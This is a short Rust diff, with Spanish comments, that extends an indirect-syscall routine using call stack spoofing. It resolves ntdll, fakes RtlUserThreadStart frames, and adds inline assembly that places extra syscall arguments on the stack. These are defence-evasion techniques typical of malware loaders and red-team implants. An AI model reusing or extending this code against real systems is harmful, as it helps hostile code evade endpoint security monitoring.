@@ -15,6 +15,8 @@ pub unsafe fn indirect_syscall_6(
     a4: usize,
     a5: usize,
     a6: usize,
+    a7: usize,
+    a8: usize,
 ) -> Result<i32, String> {
     let base = match unsafe { get_ntdll_base() } {
         Ok(base) => base,
@@ -36,10 +38,14 @@ pub unsafe fn indirect_syscall_6(
         };
 
     // calculamos la estructura con toda la info de call stack spoofing
-    let spoof_data = match prepare_spoof_data() {
+    let mut spoof_data = match prepare_spoof_data() {
         Ok(data) => data,
         Err(e) => return Err(format!("Failed to prepare spoof data: {}", e)),
     };
+    spoof_data.a5 = a5;
+    spoof_data.a6 = a6;
+    spoof_data.a7 = a7;
+    spoof_data.a8 = a8;
     let spoof_ptr = &spoof_data as *const SpoofData;
     let mut status: i32;
 
@@ -60,8 +66,17 @@ pub unsafe fn indirect_syscall_6(
                 "sub rsp, r11", // agrandamos el tamaño de la pila
 
                 // se aprovecha de el ultimo espacio del stack para guardar las vars, muy loco!!!
-                "mov [rsp + 0x28], r13", //reg 5 y 6
-                "mov [rsp + 0x30], r14",
+                "mov r10, [{spoof_ptr_reg} + 0x50]",
+                "mov [rsp + 0x28], r10",  // a5"
+
+                "mov r10, [{spoof_ptr_reg} + 0x58]",
+                "mov [rsp + 0x30], r10",  // a6
+
+                "mov r10, [{spoof_ptr_reg} + 0x60]",
+                "mov [rsp + 0x38], r10",  // a7
+
+                "mov r10, [{spoof_ptr_reg} + 0x68]",
+                "mov [rsp + 0x40], r10", // a8
 
                 //  RtlUserThreadStart
                 "mov r10, [{spoof_ptr_reg} + 0x08]",   // pos1
